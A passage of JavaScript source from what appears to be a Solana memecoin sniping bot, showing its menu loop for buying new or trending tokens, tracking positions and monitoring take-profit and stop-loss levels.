                            console.log(`Coin passed filters: ${coin.name} (${coin.symbol})`);

                            // Check if already bought
                            if (purchasedCoins.some(c => c.mint === coin.mint)) {
                                console.log('Coin already purchased. Skipping...');
                                continue;
                            }

                            // Buy the coin
                            console.log(`Buying ${settings.buyAmount} SOL worth of ${coin.symbol}...`);
                            const boughtTokens = await buyCoin(connection, payer, coin, settings.buyAmount);
                            if (!boughtTokens) {
                                console.error(`Failed to buy ${coin.name}.`);
                                continue;
                            }

                            const buyPrice = coin.market_cap / coin.total_supply;
                            console.log(`Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`);

                            // Update positions
                            purchasedCoins.push({ name: coin.name, symbol: coin.symbol, amount: boughtTokens, price: buyPrice, mint: coin.mint });
                            savePurchasedCoins(purchasedCoins);

                            // Start monitoring for take profit and stop loss
                            if (settings.takeProfitEnabled || settings.stopLossEnabled) {
                                console.log(`Monitoring price for ${coin.symbol}.`);
                                monitorAndSell(connection, payer, coin.mint, boughtTokens, buyPrice);
                            }
                        } else {
                            console.log(`Coin did not pass filters or not found: ${mintAddress}`);
                        }
                        */
                    }
                }
            } catch (error) {
                console.error("Error processing new token mint:", error);
            }
        }
    });

    console.log("Listening for new tokens...");
};

(async () => {
    try {
        while (true) {
            const action = await mainMenu();

            if (action === "exit") {
                console.log("Exiting...");
                break;
            } else if (action === "stop_auto_buy") {
                autoBuyRunning = false;
                console.log("Auto-buy stopped.");
            }

            const connection = new Connection(
                CUSTOM_RPC_URL || clusterApiUrl("mainnet-beta"),
                "confirmed",
            );
            const payer = await getKeyPairFromPrivateKey(PRIVATE_KEY);

            if (action === "start_monitoring") {
                await startOnChainMonitoring(connection, payer);
            } else if (action === "buy_latest_coin") {
                if (settings.auto) {
                    autoBuyRunning = true; // Ensure auto-buy is set to true before running
                    await buyLatestCoins(connection, payer);
                } else {
                    await buyLatestCoin(connection, payer);
                }
            } else if (action === "buy_king_coin") {
                const coin = await getKingOfTheHillCoin();
                console.log(
                    `King of the hill coin: ${coin.name} (${coin.symbol})`,
                );
                console.log(
                    `Buying ${settings.buyAmount} SOL worth of ${coin.symbol}...`,
                );

                const boughtTokens = await buyCoin(
                    connection,
                    payer,
                    coin,
                    settings.buyAmount,
                );
                if (!boughtTokens) {
                    console.error(
                        `Failed to buy King of the Hill coin. Returning to menu...`,
                    );
                    continue;
                }

                const buyPrice = coin.market_cap / coin.total_supply;
                console.log(
                    `Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`,
                );

                // Update existing position or add new one
                const existingCoinIndex = purchasedCoins.findIndex(
                    (c) => c.mint === coin.mint,
                );
                if (existingCoinIndex > -1) {
                    purchasedCoins[existingCoinIndex].amount += boughtTokens;
                    purchasedCoins[existingCoinIndex].price =
                        (purchasedCoins[existingCoinIndex].price + buyPrice) /
                        2;
                } else {
                    purchasedCoins.push({
                        name: coin.name,
                        symbol: coin.symbol,
                        amount: boughtTokens,
                        price: buyPrice,
                        mint: coin.mint,
                    });
                }
                savePurchasedCoins(purchasedCoins);

                if (settings.takeProfitEnabled || settings.stopLossEnabled) {
                    console.log(
                        `Monitoring price. Will sell when profit reaches ${settings.takeProfitPercentage}% or stop loss reaches ${settings.stopLossPercentage}%...`,
                    );
                    monitorAndSell(
                        connection,
                        payer,
                        coin.mint,
                        boughtTokens,
                        buyPrice,
                    );
                }

                console.log("Returning to menu...");
            } else if (action === "view_latest_coins") {
                while (true) {
                    const selectedCoin = await displayLatestCoins(10); // Fetch more coins
                    if (!selectedCoin) break;

                    const coinAction = await displayCoinDetails(selectedCoin);
                    if (coinAction === "buy") {
                        console.log(
                            `Buying ${settings.buyAmount} SOL worth of ${selectedCoin.symbol}...`,
                        );

                        const boughtTokens = await buyCoin(
                            connection,
                            payer,
                            selectedCoin,
                            settings.buyAmount,
                        );
                        if (!boughtTokens) {
                            console.error(
                                `Failed to buy ${selectedCoin.name}. Returning to menu...`,
                            );
                            continue;
                        }

                        const buyPrice =
                            selectedCoin.market_cap / selectedCoin.total_supply;
                        console.log(
                            `Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`,
                        );

                        // Update existing position or add new one
                        const existingCoinIndex = purchasedCoins.findIndex(
                            (c) => c.mint === selectedCoin.mint,
                        );
                        if (existingCoinIndex > -1) {
                            purchasedCoins[existingCoinIndex].amount +=
                                boughtTokens;
                            purchasedCoins[existingCoinIndex].price =
                                (purchasedCoins[existingCoinIndex].price +
                                    buyPrice) /
                                2;
                        } else {
                            purchasedCoins.push({
                                name: selectedCoin.name,
                                symbol: selectedCoin.symbol,
                                amount: boughtTokens,
                                price: buyPrice,
                                mint: selectedCoin.mint,
                            });
                        }
                        savePurchasedCoins(purchasedCoins);

                        if (
                            settings.takeProfitEnabled ||
                            settings.stopLossEnabled
                        ) {
                            console.log(
                                `Monitoring price. Will sell when profit reaches ${settings.takeProfitPercentage}% or stop loss reaches ${settings.stopLossPercentage}%...`,
                            );
                            monitorAndSell(
                                connection,
                                payer,
                                selectedCoin.mint,
                                boughtTokens,
                                buyPrice,
                            );
                        }

                        console.log("Returning to menu...");
                    }
                }
            } else if (action === "view_positions") {
                await viewPositions(connection, payer);
            } else if (action === "set_settings") {
                await setSettings();
            } else if (action === "buy_by_contract") {
                await buyCoinByContract(connection, payer);
            }
        }
    } catch (error) {
        console.error("An error occurred:", error);
    }
})();
